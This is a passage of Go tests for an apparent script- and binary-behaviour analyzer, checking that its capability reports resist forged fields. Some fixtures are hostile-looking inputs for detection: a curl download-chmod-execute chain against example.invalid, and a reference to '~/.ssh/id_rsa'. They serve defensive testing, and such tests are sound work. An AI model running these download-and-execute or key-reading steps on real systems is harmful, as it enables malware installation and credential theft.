	t.Run("empty connectivity", func(t *testing.T) {
		rep := connectedReferenceReport()
		rep.Operations[0].Execution = behavior.ExecutionContext{}
		assertValidationErrorContains(t, rep, "operations[0].execution.connectivity must not be empty")
	})
	t.Run("foreign sibling target", func(t *testing.T) {
		rep := connectedReferenceReport()
		foreign := rep.InvokedTargets[0]
		foreign.ID = "target-2"
		foreign.NodeID = "node-root"
		foreign.ScopeID = "scope-root"
		rep.InvokedTargets = append(rep.InvokedTargets, foreign)
		rep.Operations[0].Execution.InvokedTargetIDs = append(rep.Operations[0].Execution.InvokedTargetIDs, foreign.ID)
		assertValidationErrorContains(t, rep, "is not in an ownership chain")
	})
	t.Run("target does not support root", func(t *testing.T) {
		rep := connectedReferenceReport()
		second := rep.ExecutionRoots[0]
		second.ID = "root-2"
		rep.ExecutionRoots = append(rep.ExecutionRoots, second)
		rep.Operations[0].Execution.ExecutionRootIDs = append(rep.Operations[0].Execution.ExecutionRootIDs, second.ID)
		assertValidationErrorContains(t, rep, `root "root-2" does not own any retained target`)
	})
}

func TestValidateReportReferencesRejectsEmptySemanticFields(t *testing.T) {
	tests := []struct {
		name   string
		want   string
		mutate func(*Report)
	}{
		{name: "root kind", want: "execution_roots[0].kind", mutate: func(rep *Report) { rep.ExecutionRoots[0].Kind = "" }},
		{name: "target kind", want: "invoked_targets[0].kind", mutate: func(rep *Report) { rep.InvokedTargets[0].Kind = "" }},
		{name: "feature key", want: "features[0].key", mutate: func(rep *Report) { rep.Features[0].Key = "" }},
		{name: "operation kind", want: `operations[0].kind has invalid value "arbitrary"`, mutate: func(rep *Report) { rep.Operations[0].Kind = "arbitrary" }},
		{name: "operation missing required binding", want: `requires resource role "executable"`, mutate: func(rep *Report) {
			rep.Operations[0].ResourceBindings = behavior.Bindings(behavior.Bind(behavior.ResourceRoleArguments, behavior.NewResource(behavior.ResourceCommand, "--help")))
		}},
		{name: "operation invalid role kind", want: "are incompatible", mutate: func(rep *Report) { rep.Operations[0].ResourceBindings[0].Resource.Kind = behavior.ResourceURL }},
		{name: "capability namespace", want: "capability_matches[0].namespace", mutate: func(rep *Report) { rep.Capabilities[0].Namespace = "" }},
		{name: "evidence method", want: "evidence[0].extraction_method", mutate: func(rep *Report) { rep.Evidence[0].Method = "" }},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := connectedReferenceReport()
			test.mutate(&rep)
			assertValidationErrorContains(t, rep, test.want)
		})
	}
}

func TestValidateReportReferencesRejectsInvalidAnalysis(t *testing.T) {
	rep := connectedReferenceReport()
	rep.Analysis.Architecture = "ppc"
	assertValidationErrorContains(t, rep, `analysis.architecture has invalid value "ppc"`)

	rep = connectedReferenceReport()
	rep.Analysis.MaxEvidence = artifact.DefaultMaxEvidence + 1
	assertValidationErrorContains(t, rep, "analysis.max_evidence exceeds maximum")
}

func TestGeneratedReportsSatisfyReferenceContract(t *testing.T) {
	root := t.TempDir()
	script := filepath.Join(root, "agent.py")
	if err := os.WriteFile(script, []byte("import requests\nrequests.get('https://contract.example/payload')\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	inspected, err := InspectPath(script, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	inline, err := inspectInlineShellForTest("python agent.py", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	for name, rep := range map[string]Report{"inspect": inspected, "inline": inline} {
		t.Run(name, func(t *testing.T) {
			if err := validateReportReferences(rep); err != nil {
				t.Fatalf("generated report violates reference contract: %v", err)
			}
		})
	}
}

func TestGeneratedJavaScriptLexicalFeaturesSurviveStrictReport(t *testing.T) {
	root := t.TempDir()
	script := filepath.Join(root, "fixture.js")
	source := []byte(`import fs from "node:fs";
"https://javascript-feature.example.invalid/p";
"~/.ssh/id_rsa";
`)
	if err := os.WriteFile(script, source, 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(script, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	again, err := InspectPath(script, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(rep, again) {
		t.Fatal("generated JavaScript report is nondeterministic")
	}
	if len(rep.Operations) != 0 ||
		len(rep.NetworkImplementations) != 0 ||
		len(rep.Capabilities) != 0 {
		t.Fatalf("JavaScript syntax inventory manufactured semantics: %#v", rep)
	}
	evidenceByID := map[string]behavior.Evidence{}
	for _, evidence := range rep.Evidence {
		evidenceByID[evidence.ID] = evidence
	}
	var module, url, sensitive bool
	for _, feature := range rep.Features {
		lexical := false
		for _, evidenceID := range feature.EvidenceIDs {
			if evidenceByID[evidenceID].Method == "javascript-lexical" {
				lexical = true
			}
		}
		if feature.Key == "javascript.module_specifier" &&
			feature.Value == "node:fs" &&
			feature.Qualifiers["form"] == "esm-import" &&
			lexical {
			module = true
		}
		if feature.Key == "network.url" &&
			feature.Value == "https://javascript-feature.example.invalid/p" &&
			lexical {
			url = true
		}
		if feature.Key == "script.sensitive_resource" &&
			feature.Value == "~/.ssh/id_rsa" &&
			feature.Qualifiers["category"] == "ssh-private-key" &&
			lexical {
			sensitive = true
		}
	}
	if !module || !url || !sensitive {
		t.Fatalf("generated report lost bounded JavaScript observations: %#v", rep.Features)
	}
	if _, err := encodeAndDecodeReport(rep); err != nil {
		t.Fatalf("strict reload rejected generated JavaScript observations: %v", err)
	}
}

func TestGeneratedSuccessfulMatchTraceSurvivesStrictJSONReload(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl -o /tmp/payload https://example.invalid/payload\nchmod +x /tmp/payload\n/tmp/payload", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Capabilities) == 0 {
		t.Fatal("fixture produced no capability matches")
	}
	var encoded bytes.Buffer
	if err := WriteJSON(&encoded, rep); err != nil {
		t.Fatal(err)
	}
	reloaded, err := decodeReport(bytes.NewReader(encoded.Bytes()))
	if err != nil {
		t.Fatalf("strict reload rejected generated report: %v", err)
	}
	for index, capability := range reloaded.Capabilities {
		if len(capability.MatchTrace) == 0 {
			t.Fatalf("capability_matches[%d] lost its match trace", index)
		}
	}
}

func TestCurrentCatalogReplayAcceptsIdentityPreservingOverlongResourceOmission(t *testing.T) {
	value := "/tmp/" + strings.Repeat("a", 5000)
	rep, err := fromGraphs(
		"fixture",
		artifact.Graph{Nodes: []artifact.Node{{
			ID: "node-1", LogicalPath: "fixture", Kind: "script", AnalyzeStatus: "analyzed",
		}}},
		behavior.Graph{
			Evidence: []behavior.Evidence{{
				ID: "ev-1", NodeID: "node-1", Method: "fixture", Kind: "command", Value: value,
			}},
			Operations: []behavior.ModeledOperation{{
				ID:            "operation-1",
				SubjectNodeID: "node-1",
				Kind:          behavior.OperationProcessExecute,
				ResourceBindings: behavior.Bindings(
					behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, value)),
				),
				EvidenceIDs: []string{"ev-1"},
				Support:     behavior.SupportCorroborated,
				Execution:   behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
			}},
		},
		nil,
		artifact.Options{},
	)
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Capabilities) != 1 || rep.Capabilities[0].RuleID != "macos.file-execution" || len(rep.Capabilities[0].AffectedResources) != 0 {
		t.Fatalf("overlong resource projection = %#v", rep.Capabilities)
	}
	if _, err := encodeAndDecodeReport(rep); err != nil {
		t.Fatalf("strict replay rejected identity-preserving projection omission: %v", err)
	}
	t.Run("missing engine coverage", func(t *testing.T) {
		forged := rep
		forged.Coverage = nil
		if _, err := encodeAndDecodeReport(forged); err == nil || !strings.Contains(err.Error(), "rule-evaluation coverage does not equal") {
			t.Fatalf("missing engine coverage error = %v", err)
		}
	})
	t.Run("forged engine coverage detail", func(t *testing.T) {
		forged := rep
		forged.Coverage = append([]behavior.Coverage(nil), rep.Coverage...)
		for index := range forged.Coverage {
			if forged.Coverage[index].AnalysisArea == "rule-evaluation" {
				forged.Coverage[index].Detail = "forged limit"
			}
		}
		if _, err := encodeAndDecodeReport(forged); err == nil || !strings.Contains(err.Error(), "rule-evaluation coverage does not equal") {
			t.Fatalf("forged engine coverage error = %v", err)
		}
	})
}

func TestDecodeReportReevaluatesCurrentCatalogCapabilityProjection(t *testing.T) {
	root := t.TempDir()
	script := filepath.Join(root, "sample.sh")
	if err := os.WriteFile(script, []byte("/tmp/original\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	inspect := func(t *testing.T) (Report, int, int) {
		t.Helper()
		rep, err := InspectPath(script, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		capabilityIndex := -1
		for index, capability := range rep.Capabilities {
			if capability.RuleID == "macos.file-execution" {
				capabilityIndex = index
				break
			}
		}
		if capabilityIndex < 0 {
			t.Fatalf("fixture produced no file-execution capability: %#v", rep.Capabilities)
		}
		operationID := rep.Capabilities[capabilityIndex].OperationIDs[0]
		operationIndex := -1
		for index, operation := range rep.Operations {
			if operation.ID == operationID {
				operationIndex = index
				break
			}
		}
		if operationIndex < 0 {
			t.Fatalf("fixture capability references missing operation %q", operationID)
		}
		return rep, capabilityIndex, operationIndex
	}

	rep, _, _ := inspect(t)
	if _, err := encodeAndDecodeReport(rep); err != nil {
		t.Fatalf("strict replay rejected an unmodified current report: %v", err)
	}
	var before, after bytes.Buffer
	if err := WriteJSON(&before, rep); err != nil {
		t.Fatal(err)
	}
	if err := validateReportReferences(rep); err != nil {
		t.Fatalf("direct current-catalog replay failed: %v", err)
	}
	if err := WriteJSON(&after, rep); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(before.Bytes(), after.Bytes()) {
		t.Fatal("current-catalog replay mutated the caller's report")
	}

	tests := []struct {
		name   string
		mutate func(*Report, int, int)
	}{
		{name: "missing match", mutate: func(rep *Report, _, _ int) { rep.Capabilities = nil }},
		{name: "extra match", mutate: func(rep *Report, capabilityIndex, _ int) {
			extra := rep.Capabilities[capabilityIndex]
			extra.ID = "match-9999"
			rep.Capabilities = append(rep.Capabilities, extra)
		}},
		{name: "metadata", mutate: func(rep *Report, capabilityIndex, _ int) {
			rep.Capabilities[capabilityIndex].Title = "Forged title"
		}},
		{name: "omitted resource", mutate: func(rep *Report, capabilityIndex, _ int) {
			rep.Capabilities[capabilityIndex].AffectedResources = nil
		}},
		{name: "different bound role", mutate: func(rep *Report, capabilityIndex, operationIndex int) {
			operation := &rep.Operations[operationIndex]
			operation.ResourceBindings = append(operation.ResourceBindings,
				behavior.Bind(behavior.ResourceRoleArguments, behavior.NewResource(behavior.ResourceCommand, "--verbose")),
			)
			operation.ResourceBindings, _ = behavior.NormalizeResourceBindings(operation.Kind, operation.ResourceBindings)
			rep.Capabilities[capabilityIndex].AffectedResources = []behavior.Resource{
				behavior.NewResource(behavior.ResourceCommand, "--verbose"),
			}
		}},
		{name: "plausible but wrong trace shape", mutate: func(rep *Report, capabilityIndex, _ int) {
			rep.Capabilities[capabilityIndex].MatchTrace[0].Path = "match.each.left"
		}},
		{name: "weakened support", mutate: func(rep *Report, _, operationIndex int) {
			rep.Operations[operationIndex].Support = behavior.SupportDirect
		}},
		{name: "omitted traced evidence", mutate: func(rep *Report, _, operationIndex int) {
			item := rep.Evidence[0]
			item.ID = "ev-extra"
			rep.Evidence = append(rep.Evidence, item)
			rep.Operations[operationIndex].EvidenceIDs = append(rep.Operations[operationIndex].EvidenceIDs, item.ID)
		}},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep, capabilityIndex, operationIndex := inspect(t)
			test.mutate(&rep, capabilityIndex, operationIndex)
			_, err := encodeAndDecodeReport(rep)
			if err == nil || !strings.Contains(err.Error(), "deterministic projection of the recorded current rule catalog") {
				t.Fatalf("decodeReport() error = %v, want current-catalog projection rejection", err)
			}
		})
	}
}

func TestDecodeReportDoesNotReplayUnavailableHistoricalCatalog(t *testing.T) {
	root := t.TempDir()
	script := filepath.Join(root, "sample.sh")
	if err := os.WriteFile(script, []byte("/tmp/original\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	base, err := InspectPath(script, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	for _, mutateIdentity := range []func(*Report){
		func(rep *Report) { rep.RuleCatalogDigest = "sha256:" + strings.Repeat("0", 64) },
		func(rep *Report) { rep.RulesetVersion = "maratus.rules.v0.2-preview.10" },
	} {
		rep := base
		rep.Capabilities = append([]behavior.CapabilityMatch(nil), base.Capabilities...)
		rep.Capabilities[0].Title = "Historical catalog title"
		mutateIdentity(&rep)
		if _, err := encodeAndDecodeReport(rep); err != nil {
			t.Fatalf("historical catalog should receive structural validation only: %v", err)
		}
	}
}

func TestValidateReportReferencesRejectsCapabilityProjectionCardinalityBeforeSemanticJoins(t *testing.T) {
	rep := connectedReferenceReport()
	rep.Capabilities[0].AffectedResources = make([]behavior.Resource, 17)
	assertValidationErrorContains(t, rep, "affected_resources has 17 items; limit is 16")
}

func TestDecodeReportRejectsForgedRuleEvaluationCoverageForCurrentCatalog(t *testing.T) {
	root := t.TempDir()
	script := filepath.Join(root, "sample.sh")
	if err := os.WriteFile(script, []byte("/tmp/original\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	base, err := InspectPath(script, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		name   string
		mutate func(*Report)
	}{
		{name: "invented marker", mutate: func(rep *Report) {
			rep.Coverage = append(rep.Coverage, behavior.Coverage{
				AnalysisArea: "rule-evaluation",
				Status:       "partial",
				Detail:       "forged limit",
			})
		}},
		{name: "duplicate marker", mutate: func(rep *Report) {
			marker := behavior.Coverage{AnalysisArea: "rule-evaluation", Status: "partial", Detail: "forged limit"}
			rep.Coverage = append(rep.Coverage, marker, marker)
		}},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			rep := base
			rep.Coverage = append([]behavior.Coverage(nil), base.Coverage...)
			test.mutate(&rep)
			_, err := encodeAndDecodeReport(rep)
			if err == nil || !strings.Contains(err.Error(), "rule-evaluation coverage does not equal") {
				t.Fatalf("decodeReport() error = %v, want exact coverage rejection", err)
			}
		})
	}
}

func encodeAndDecodeReport(rep Report) (Report, error) {
	var encoded bytes.Buffer
	if err := WriteJSON(&encoded, rep); err != nil {
		return Report{}, err
	}
	return decodeReport(bytes.NewReader(encoded.Bytes()))
}

func assertValidationErrorContains(t *testing.T, rep Report, want string) {
	t.Helper()
	err := validateReportReferences(rep)
	if err == nil || !strings.Contains(err.Error(), want) {
		t.Fatalf("validateReportReferences() error = %v, want %q", err, want)
	}
}

func assertValidReport(t *testing.T, rep Report) {
	t.Helper()
	if err := validateReportReferences(rep); err != nil {
		t.Fatalf("validateReportReferences() error = %v", err)
	}
}

func appendFixtureEvidence(rep *Report, id, nodeID, scopeID, architecture string) {
	item := rep.Evidence[0]
	item.ID = id
	item.NodeID = nodeID
	item.ScopeID = scopeID
	item.Arch = architecture
	item.Function = ""
	for _, scope := range rep.Scopes {
		if scope.ID == scopeID {
			item.Function = scope.Function
			break
		}
	}
	rep.Evidence = append(rep.Evidence, item)
}

func appendFixtureFunctionEvidence(rep *Report, id, function string) {
	scopeID := "scope-" + function
	rep.Scopes = append(rep.Scopes, behavior.Scope{
		ID: scopeID, NodeID: "node-child", ParentID: "scope-root", Kind: "function",
		Name: function, Function: function, Architecture: "arm64",
	})
	item := rep.Evidence[0]
	item.ID = id
	item.NodeID = "node-child"
	item.ScopeID = scopeID
	item.Function = function
	item.Arch = "arm64"
	rep.Evidence = append(rep.Evidence, item)
}

func appendFixtureSameNameScopeEvidence(rep *Report, id string) {
	rep.Scopes = append(rep.Scopes, behavior.Scope{
		ID: "scope-same-name", NodeID: "node-child", Kind: "function",
		Name: "fixtureFunction", Function: "fixtureFunction", Architecture: "arm64",
	})
	item := rep.Evidence[0]
	item.ID = id
	item.NodeID = "node-child"
	item.ScopeID = "scope-same-name"
	item.Function = "fixtureFunction"
	item.Arch = "arm64"
	rep.Evidence = append(rep.Evidence, item)
}

type capabilityProjectionForgeryCase struct {
	name   string
	want   string
	mutate func(*Report)
}

func capabilityProjectionForgeryCases() []capabilityProjectionForgeryCase {
	return []capabilityProjectionForgeryCase{
		{
			name: "forged resource value",
			want: "is not physically bound to a supporting operation",
			mutate: func(rep *Report) {
				rep.Capabilities[0].AffectedResources[0].Value = "/tmp/forged"
			},
		},
		{
			name: "forged resource classification",
			want: "classification \"package\" is not projected",
			mutate: func(rep *Report) {
				rep.Capabilities[0].AffectedResources[0].Classifications = []behavior.ResourceClassification{behavior.ResourceClassPackage}
			},
		},
		{
			name: "forged resource kind",
			want: "is not physically bound to a supporting operation",
			mutate: func(rep *Report) {
				rep.Capabilities[0].AffectedResources[0].Kind = behavior.ResourceURL
			},
		},
		{
			name: "duplicate projected resource",
			want: "duplicates a projected resource",
			mutate: func(rep *Report) {
				rep.Capabilities[0].AffectedResources = append(rep.Capabilities[0].AffectedResources, rep.Capabilities[0].AffectedResources[0])
			},
		},
		{
			name: "empty evidence",
			want: "evidence_ids must not be empty",
			mutate: func(rep *Report) {
				rep.Capabilities[0].EvidenceIDs = nil
			},
		},
		{
			name: "unrelated existing evidence",
			want: "is not evidence of a fact named by match_trace",
			mutate: func(rep *Report) {
				appendFixtureEvidence(rep, "ev-unrelated", "node-child", "scope-child", "arm64")
				rep.Features[0].EvidenceIDs = append(rep.Features[0].EvidenceIDs, "ev-unrelated")
				rep.Capabilities[0].EvidenceIDs = []string{"ev-unrelated"}
			},
		},
		{
			name: "binding-only evidence",
			want: "is not evidence of a fact named by match_trace",
			mutate: func(rep *Report) {
				appendFixtureEvidence(rep, "ev-binding", "node-child", "scope-child", "arm64")
				rep.Operations[0].ResourceBindings[0].EvidenceIDs = []string{"ev-binding"}
				rep.Capabilities[0].EvidenceIDs = []string{"ev-binding"}
			},
		},
		{
			name: "missing architecture projection",
			want: "must exactly equal the canonical supporting-operation architectures",
			mutate: func(rep *Report) {
				rep.Capabilities[0].ArchitectureScopes = nil
			},
		},
		{
			name: "different canonical architecture projection",
			want: "must exactly equal the canonical supporting-operation architectures",
			mutate: func(rep *Report) {
				rep.Capabilities[0].ArchitectureScopes = []string{"x86_64"}
			},
		},
		{
			name: "duplicate architecture projection",
			want: "duplicates \"arm64\"",
			mutate: func(rep *Report) {
				rep.Capabilities[0].ArchitectureScopes = []string{"arm64", "arm64"}
			},
		},
		{
			name: "heuristic capability support",
			want: "support must not be HEURISTIC",
			mutate: func(rep *Report) {
				rep.Capabilities[0].Support = behavior.SupportHeuristic
			},
		},
		{
			name: "support stronger than traced feature",
			want: "is stronger than traced feature",
			mutate: func(rep *Report) {
				rep.Operations[0].Support = behavior.SupportDirect
				rep.Capabilities[0].Support = behavior.SupportDirect
				rep.Capabilities[0].MatchTrace = []behavior.MatchTraceClause{
					{Path: "match.each.left", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"}},
					{Path: "match.each.right", Kind: behavior.MatchTraceFeature, FeatureIDs: []string{"feature-1"}},
				}
			},
		},
		{
			name: "support stronger than traced relation",
			want: "is stronger than traced operation relation",
			mutate: func(rep *Report) {
				rep.Operations[0].Support = behavior.SupportDirect
				rep.Operations[1].Support = behavior.SupportDirect
				rep.OperationRelations = []behavior.OperationRelation{{
					ID:           "relation-1",
					Kind:         behavior.RelationPrecedes,
					From:         behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-1"),
					To:           behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-network"),
					EvidenceIDs:  []string{"ev-1"},
					Support:      behavior.SupportCorroborated,
					Execution:    rep.Operations[0].Execution,
					Architecture: "arm64",
				}}
				rep.Capabilities[0].Support = behavior.SupportDirect
				rep.Capabilities[0].OperationIDs = []string{"operation-1", "operation-network"}
				rep.Capabilities[0].MatchTrace = []behavior.MatchTraceClause{
					{Path: "match.relate.constraint", Kind: behavior.MatchTraceOperationRelation, RelationIDs: []string{"relation-1"}},
					{Path: "match.relate.left", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"}},
					{Path: "match.relate.right", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-network"}},
				}
			},
		},
		{
			name: "mixed supporting operation subject",
			want: "differs from supporting operation \"operation-foreign\" subject",
			mutate: func(rep *Report) {
				appendFixtureEvidence(rep, "ev-foreign", "node-root", "scope-root", "")
				rep.Operations = append(rep.Operations, behavior.ModeledOperation{
					ID:               "operation-foreign",
					SubjectNodeID:    "node-root",
					ScopeID:          "scope-root",
					Kind:             behavior.OperationProcessExecute,
					ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "/tmp/foreign"))),
					EvidenceIDs:      []string{"ev-foreign"},
					Support:          behavior.SupportCorroborated,
					Execution:        behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
				})
				rep.Capabilities[0].OperationIDs = []string{"operation-1", "operation-foreign"}
				rep.Capabilities[0].Execution = behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}
				rep.Capabilities[0].MatchTrace[0].OperationIDs = []string{"operation-1", "operation-foreign"}
			},
		},
		{
			name: "coordinated arbitrary architecture",
			want: "noncanonical fact architecture \"forged-arch\"",
			mutate: func(rep *Report) {
				rep.ArtifactNodes[1].Architectures = []string{"forged-arch"}
				rep.Scopes[1].Architecture = "forged-arch"
				rep.Evidence[0].Arch = "forged-arch"
				rep.Features[0].Architecture = "forged-arch"
				for index := range rep.Operations {
					rep.Operations[index].Architecture = "forged-arch"
				}
				rep.NetworkImplementations[0].Architecture = "forged-arch"
				rep.Capabilities[0].ArchitectureScopes = []string{"forged-arch"}
			},
		},
	}
}

func prepareSavedFixture(rep *Report) {
	rep.ToolVersion = "test"
	rep.RulesetVersion = RulesetVersion
	rep.RuleCatalogDigest = "sha256:" + strings.Repeat("0", 64)
	rep.Artifact = "fixture"
}

func resourceFlowProjectionReport() Report {
	rep := connectedReferenceReport()
	appendFixtureEvidence(&rep, "ev-flow", "node-child", "scope-child", "arm64")
	archive := behavior.NewResource(behavior.ResourceFile, "/tmp/payload", behavior.ResourceClassArchive)
	packaged := behavior.NewResource(behavior.ResourceFile, "/tmp/payload", behavior.ResourceClassPackage)
	merged := behavior.NewResource(behavior.ResourceFile, "/tmp/payload", behavior.ResourceClassArchive, behavior.ResourceClassPackage)
	rep.Operations[0] = behavior.ModeledOperation{
		ID:             "operation-1",
		SubjectNodeID:  "node-child",
		ScopeID:        "scope-child",
		Architecture:   "arm64",
		SourceFunction: "fixtureFunction",
		Kind:           behavior.OperationNetworkDownload,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, "https://example.invalid/payload")),
			behavior.Bind(behavior.ResourceRoleLocalOutput, archive),
		),
		EvidenceIDs: []string{"ev-1", "ev-flow"},
		Support:     behavior.SupportCorroborated,
		Execution:   rep.Operations[0].Execution,
	}
	rep.Operations[1] = behavior.ModeledOperation{
		ID:               "operation-network",
		SubjectNodeID:    "node-child",
		ScopeID:          "scope-child",
		Architecture:     "arm64",
		SourceFunction:   "fixtureFunction",
		Kind:             behavior.OperationProcessExecute,
		ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, packaged)),
		EvidenceIDs:      []string{"ev-1", "ev-flow"},
		Support:          behavior.SupportCorroborated,
		Execution:        rep.Operations[0].Execution,
	}
	rep.Operations[0].ResourceBindings, _ = behavior.NormalizeResourceBindings(rep.Operations[0].Kind, rep.Operations[0].ResourceBindings)
	rep.Operations[1].ResourceBindings, _ = behavior.NormalizeResourceBindings(rep.Operations[1].Kind, rep.Operations[1].ResourceBindings)
	rep.NetworkImplementations[0].OperationIDs = []string{"operation-1"}
	rep.OperationRelations = []behavior.OperationRelation{
		{
			ID:           "relation-produces",
			Kind:         behavior.RelationProduces,
			From:         behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-1"),
			To:           behavior.ResourceRelationEndpoint(behavior.ResourceRoleLocalOutput, archive),
			EvidenceIDs:  []string{"ev-flow"},
			Support:      behavior.SupportCorroborated,
			Execution:    rep.Operations[0].Execution,
			Architecture: "arm64",
		},
		{
			ID:           "relation-precedes",
			Kind:         behavior.RelationPrecedes,
			From:         behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-1"),
			To:           behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-network"),
			EvidenceIDs:  []string{"ev-flow"},
			Support:      behavior.SupportCorroborated,
			Execution:    rep.Operations[0].Execution,
			Architecture: "arm64",
		},
		{
			ID:           "relation-consumes",
			Kind:         behavior.RelationConsumes,
			From:         behavior.ResourceRelationEndpoint(behavior.ResourceRoleExecutable, packaged),
			To:           behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-network"),
			EvidenceIDs:  []string{"ev-flow"},
			Support:      behavior.SupportCorroborated,
			Execution:    rep.Operations[0].Execution,
			Architecture: "arm64",
		},
	}
	rep.Capabilities[0].AffectedResources = []behavior.Resource{merged}
	rep.Capabilities[0].OperationIDs = []string{"operation-1", "operation-network"}
	rep.Capabilities[0].EvidenceIDs = []string{"ev-1", "ev-flow"}
	rep.Capabilities[0].MatchTrace = []behavior.MatchTraceClause{
		{Path: "match.resource_flow.steps[0].operation", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-1"}},
		{Path: "match.resource_flow.steps[0].produces", Kind: behavior.MatchTraceOperationRelation, RelationIDs: []string{"relation-produces"}},
		{Path: "match.resource_flow.steps[1].consumes", Kind: behavior.MatchTraceOperationRelation, RelationIDs: []string{"relation-consumes"}},
		{Path: "match.resource_flow.steps[1].operation", Kind: behavior.MatchTraceOperation, OperationIDs: []string{"operation-network"}},
		{Path: "match.resource_flow.steps[1].precedes", Kind: behavior.MatchTraceOperationRelation, RelationIDs: []string{"relation-precedes"}},
	}
	return rep
}

func connectedRelationReport() Report {
	rep := connectedReferenceReport()
	rep.OperationRelations = []behavior.OperationRelation{{
		ID: "relation-1", Kind: behavior.RelationConsumes,
		From:        behavior.ResourceRelationEndpoint(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "sample!payload")),
		To:          behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-1"),
		EvidenceIDs: []string{"ev-1"}, Support: behavior.SupportCorroborated,
		Architecture: "arm64",
		Execution:    behavior.ExecutionContext{Connectivity: behavior.ConnectivityConnected, ExecutionRootIDs: []string{"root-1"}, InvokedTargetIDs: []string{"target-1"}},
	}}
	return rep
}

func connectedReferenceReport() Report {
	connected := func() behavior.ExecutionContext {
		return behavior.ExecutionContext{
			Connectivity:     behavior.ConnectivityConnected,
			ExecutionRootIDs: []string{"root-1"},
			InvokedTargetIDs: []string{"target-1"},
		}
	}
	return Report{
		SchemaVersion: SchemaVersion,
		Tool:          "maratus",
		Analysis:      normalizedTestAnalysis(),
		ArtifactNodes: []artifact.Node{
			{ID: "node-root", LogicalPath: "sample", Kind: "archive", AnalyzeStatus: "analyzed"},
			{ID: "node-child", ParentID: "node-root", LogicalPath: "sample!payload", Kind: "script", AnalyzeStatus: "analyzed"},
		},
		Relationships: []artifact.Edge{{From: "node-root", To: "node-child", Kind: "contains"}},
		Scopes: []behavior.Scope{
			{ID: "scope-root", NodeID: "node-root", Kind: "artifact-node"},
			{ID: "scope-child", NodeID: "node-child", ParentID: "scope-root", Kind: "function", Function: "fixtureFunction", Architecture: "arm64"},
		},
		AnalysisSelection: []behavior.AnalysisSelection{{
			NodeID: "node-child", Reasons: []behavior.SelectionReason{behavior.SelectionReasonExecutionRoot, behavior.SelectionReasonInvokedTarget},
		}},
		ExecutionRoots: []behavior.ExecutionRoot{{
			ID: "root-1", Kind: "fixture", DeclarationNodeID: "node-root", StartNodeID: "node-child", StartScopeID: "scope-child", EvidenceIDs: []string{"ev-1"},
		}},
		InvokedTargets: []behavior.InvokedTarget{{
			ID: "target-1", Kind: "fixture-target", NodeID: "node-child", ScopeID: "scope-child",
			Source:    behavior.EntityRef{Kind: behavior.EntityKindExecutionRoot, ID: "root-1"},
			Execution: behavior.ExecutionContext{Connectivity: behavior.ConnectivityConnected, ExecutionRootIDs: []string{"root-1"}}, EvidenceIDs: []string{"ev-1"},
		}},
		Features: []behavior.Feature{{
			ID: "feature-1", NodeID: "node-child", ScopeID: "scope-child", Architecture: "arm64", Key: "fixture", Value: "present", EvidenceIDs: []string{"ev-1"}, Support: behavior.SupportCorroborated, Execution: connected(), SourceFunction: "fixtureFunction",
		}},
		Operations: []behavior.ModeledOperation{
			{ID: "operation-1", SubjectNodeID: "node-child", ScopeID: "scope-child", Architecture: "arm64", SourceFunction: "fixtureFunction", Kind: behavior.OperationProcessExecute, ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "sample!payload"})), EvidenceIDs: []string{"ev-1"}, Support: behavior.SupportCorroborated, Execution: connected()},
			{ID: "operation-network", SubjectNodeID: "node-child", ScopeID: "scope-child", Architecture: "arm64", SourceFunction: "fixtureFunction", Kind: behavior.OperationNetworkConnect, ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleRemoteDestination, behavior.Resource{Kind: behavior.ResourceURL, Value: "https://example.invalid"})), EvidenceIDs: []string{"ev-1"}, Support: behavior.SupportCorroborated, Execution: connected()},
		},
		ArtifactProperties: []behavior.ArtifactProperty{{
			NodeID: "node-child", Kind: "fixture", Value: "present", EvidenceIDs: []string{"ev-1"}, Support: behavior.SupportDirect,
		}},
